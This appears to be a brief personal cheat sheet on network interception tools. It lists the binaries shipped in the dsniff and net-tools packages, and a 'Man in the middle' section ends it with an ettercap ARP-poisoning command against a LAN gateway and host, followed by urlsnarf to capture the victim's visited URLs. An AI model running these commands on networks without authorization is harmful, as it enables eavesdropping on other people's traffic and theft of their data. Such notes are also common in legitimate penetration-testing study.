burp-proxy


## Packages

dsniff

```bash
/usr/sbin/arpspoof
/usr/sbin/dnsspoof
/usr/sbin/dsniff
/usr/sbin/filesnarf
/usr/sbin/macof
/usr/sbin/mailsnarf
/usr/sbin/msgsnarf
/usr/sbin/sshmitm
/usr/sbin/sshow
/usr/sbin/tcpkill
/usr/sbin/tcpnice
/usr/sbin/urlsnarf
/usr/sbin/webmitm
/usr/sbin/webspy
```

net-tools

```bash
/bin/netstat
/sbin/ifconfig
/sbin/ipmaddr
/sbin/iptunnel
/sbin/mii-tool
/sbin/nameif
/sbin/plipconfig
/sbin/rarp
/sbin/route
/sbin/slattach
/usr/sbin/arp
```

## Man in the middle

```bash
ettercap -M arp -p -T -q -i wlp58s0 /192.168.1.1// /192.168.1.9//

urlsnarf -i wlp58s0 
```